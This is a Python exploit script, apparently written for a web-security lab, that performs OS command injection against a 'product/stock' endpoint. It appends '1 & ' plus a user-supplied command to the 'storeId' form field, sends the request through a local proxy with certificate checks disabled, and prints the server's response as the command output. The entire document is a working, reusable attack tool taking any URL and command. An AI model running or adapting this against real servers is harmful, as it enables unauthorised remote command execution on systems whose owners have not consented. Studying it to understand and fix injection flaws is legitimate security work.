"""
-   `requests`  allows us to make http requests.    
-   `sys`       allows us to take commands from command line.
"""

import urllib3
import sys
import requests

# to disable unwanted warnings about certificates, .. etc.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# configure the proxy settings.
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def run(url, command):
    path = 'product/stock'
    command_injection = '1 & ' + command
    parameters = {'productId' : 1, 'storeId': command_injection}

    request = requests.post(url + path, data=parameters, verify=False, proxies=proxies)
    
    if len(request.text) > 3:
        print("(+) OS Command Injection Done Successfully!")
        print("(+) Output of command:\n" + request.text)
    else:
        print("(-) OS Command Injection Failed.")

def main():

    # In case the run command haven't written correctly (must be: python fileName <url> <command>)
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <command>" % sys.argv[0])
        print("(+) Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)
    
    # In case the command written correctly:
    url = sys.argv[1]
    command = sys.argv[2]
    print("(+) Exploiting OS command injection ...")
    run(url, command)

if __name__ == "__main__":
    main()